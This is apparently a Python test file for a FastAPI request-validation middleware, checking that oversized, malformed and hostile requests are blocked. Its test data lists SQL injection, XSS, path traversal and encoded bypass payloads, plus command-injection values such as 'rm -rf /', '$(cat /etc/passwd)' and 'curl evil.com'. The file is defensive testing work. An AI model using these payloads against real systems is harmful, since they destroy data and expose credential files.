"""Tests for request validation middleware."""

import pytest
from fastapi import FastAPI, HTTPException
from fastapi.testclient import TestClient

from app.middleware.request_validation import RequestValidationMiddleware


class TestRequestValidation:
    """Test request validation functionality."""

    @pytest.fixture
    def app(self):
        """Create test FastAPI app."""
        app = FastAPI()
        
        # Add request validation middleware
        app.add_middleware(RequestValidationMiddleware)
        
        # Add test endpoints
        @app.post("/test")
        async def test_endpoint(data: dict):
            return {"received": data}
        
        @app.post("/api/content/generate")
        async def content_endpoint(data: dict):
            return {"content": "generated"}
        
        return app

    @pytest.fixture
    def client(self, app):
        """Create test client."""
        return TestClient(app)

    def test_normal_request_allowed(self, client):
        """Test that normal requests are allowed."""
        data = {"content_type": "podcast_script", "topic": "AI"}
        response = client.post("/test", json=data)
        
        assert response.status_code == 200
        assert response.json()["received"] == data

    def test_oversized_request_blocked(self, client):
        """Test that oversized requests are blocked."""
        # Create large payload (over 10MB)
        large_data = {"content": "x" * (11 * 1024 * 1024)}  # 11MB
        
        response = client.post("/test", json=large_data)
        
        assert response.status_code == 413
        assert "too large" in response.json()["error"]["message"].lower()

    def test_malicious_sql_injection_blocked(self, client):
        """Test that SQL injection attempts are blocked."""
        malicious_payloads = [
            {"topic": "'; DROP TABLE users; --"},
            {"content": "1' OR '1'='1"},
            {"query": "admin'/**/UNION/**/SELECT/**/1,2,3--"},
            {"search": "x'; DELETE FROM posts WHERE 1=1; --"},
        ]
        
        for payload in malicious_payloads:
            response = client.post("/test", json=payload)
            assert response.status_code == 400, f"Should block: {payload}"
            assert "malicious" in response.json()["error"]["message"].lower()

    def test_xss_attempts_blocked(self, client):
        """Test that XSS attempts are blocked."""
        xss_payloads = [
            {"content": "<script>alert('xss')</script>"},
            {"topic": "javascript:alert('xss')"},
            {"description": "<img src=x onerror=alert('xss')>"},
            {"title": "<svg onload=alert('xss')>"},
        ]
        
        for payload in xss_payloads:
            response = client.post("/test", json=payload)
            assert response.status_code == 400, f"Should block: {payload}"
            assert "malicious" in response.json()["error"]["message"].lower()

    def test_command_injection_blocked(self, client):
        """Test that command injection attempts are blocked."""
        command_payloads = [
            {"filename": "test.txt; rm -rf /"},
            {"path": "$(cat /etc/passwd)"},
            {"command": "`whoami`"},
            {"input": "test && curl evil.com"},
        ]
        
        for payload in command_payloads:
            response = client.post("/test", json=payload)
            assert response.status_code == 400, f"Should block: {payload}"
            assert "malicious" in response.json()["error"]["message"].lower()

    def test_path_traversal_blocked(self, client):
        """Test that path traversal attempts are blocked."""
        traversal_payloads = [
            {"file": "../../../etc/passwd"},
            {"path": "..\\..\\windows\\system32\\config\\sam"},
            {"filename": "....//....//etc//passwd"},
            {"document": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        ]
        
        for payload in traversal_payloads:
            response = client.post("/test", json=payload)
            assert response.status_code == 400, f"Should block: {payload}"
            assert "malicious" in response.json()["error"]["message"].lower()

    def test_json_structure_validation(self, client):
        """Test JSON structure validation."""
        # Test deeply nested JSON (potential DoS)
        def create_nested_dict(depth):
            if depth == 0:
                return "value"
            return {"nested": create_nested_dict(depth - 1)}
        
        deep_payload = create_nested_dict(1000)  # Very deep nesting
        response = client.post("/test", json=deep_payload)
        
        # Should either block or handle gracefully
        assert response.status_code in [200, 400, 413]

    def test_content_type_validation(self, client):
        """Test content type validation."""
        # Test with invalid content type
        response = client.post(
            "/test",
            data="not json",
            headers={"Content-Type": "text/plain"}
        )
        
        # Should reject non-JSON for JSON endpoints
        assert response.status_code in [400, 415, 422]

    def test_rate_limit_integration(self, client):
        """Test integration with rate limiting."""
        # Make multiple requests to check rate limiting integration
        for i in range(5):
            response = client.post("/test", json={"test": i})
            if response.status_code == 429:
                # Hit rate limit - this is expected
                break
        # Test passes if we don't get unexpected errors

    def test_user_agent_validation(self, client):
        """Test user agent validation."""
        # Test with suspicious user agents
        suspicious_agents = [
            "sqlmap/1.0",
            "Nikto/2.1.6",
            "w3af.org",
            "ZmEu",
        ]
        
        for agent in suspicious_agents:
            response = client.post(
                "/test",
                json={"test": "data"},
                headers={"User-Agent": agent}
            )
            assert response.status_code in [400, 403], f"Should block agent: {agent}"

    def test_content_sanitization(self, client):
        """Test that content is properly sanitized."""
        # Test with content that should be sanitized but not blocked
        payload = {
            "content": "This is <b>bold</b> text with some HTML",
            "description": "Text with 'quotes' and \"double quotes\""
        }
        
        response = client.post("/test", json=payload)
        
        # Should succeed with sanitized content
        assert response.status_code == 200
        received = response.json()["received"]
        
        # Check if HTML was sanitized
        assert "<b>" not in str(received) or "sanitized" in str(received).lower()

    def test_ip_reputation_check(self, client):
        """Test IP reputation checking."""
        # Test with headers indicating suspicious IPs
        response = client.post(
            "/test",
            json={"test": "data"},
            headers={
                "X-Forwarded-For": "127.0.0.1, 192.168.1.1",  # Multiple IPs
                "X-Real-IP": "10.0.0.1"
            }
        )
        
        # Should handle IP headers properly
        assert response.status_code in [200, 400]

    def test_request_logging(self, client, caplog):
        """Test that malicious requests are logged."""
        malicious_payload = {"content": "<script>alert('xss')</script>"}
        
        response = client.post("/test", json=malicious_payload)
        
        # Should log the blocked request
        assert any("malicious" in record.message.lower() for record in caplog.records)

    def test_bypass_attempts_blocked(self, client):
        """Test that common bypass attempts are blocked."""
        bypass_payloads = [
            {"content": "javascript%3Aalert('xss')"},  # URL encoded
            {"input": "eval\\x28\\x29"},  # Hex encoded
            {"data": "&#60;script&#62;"},  # HTML entities
            {"text": "\u003cscript\u003e"},  # Unicode escape
        ]
        
        for payload in bypass_payloads:
            response = client.post("/test", json=payload)
            assert response.status_code == 400, f"Should block bypass: {payload}"

    def test_performance_impact(self, client):
        """Test that validation doesn't significantly impact performance."""
        import time
        
        payload = {"content": "Normal content for testing"}
        
        # Time multiple requests
        start_time = time.time()
        for _ in range(100):
            response = client.post("/test", json=payload)
            assert response.status_code == 200
        
        elapsed = time.time() - start_time
        
        # Should complete 100 requests in reasonable time
        assert elapsed < 5.0, f"Validation too slow: {elapsed}s for 100 requests"

    def test_whitelisted_endpoints(self, client):
        """Test that certain endpoints can bypass validation."""
        # Health check endpoints should not be heavily validated
        health_response = client.get("/health")
        
        # Should not be blocked (might return 404 if endpoint doesn't exist)
        assert health_response.status_code in [200, 404]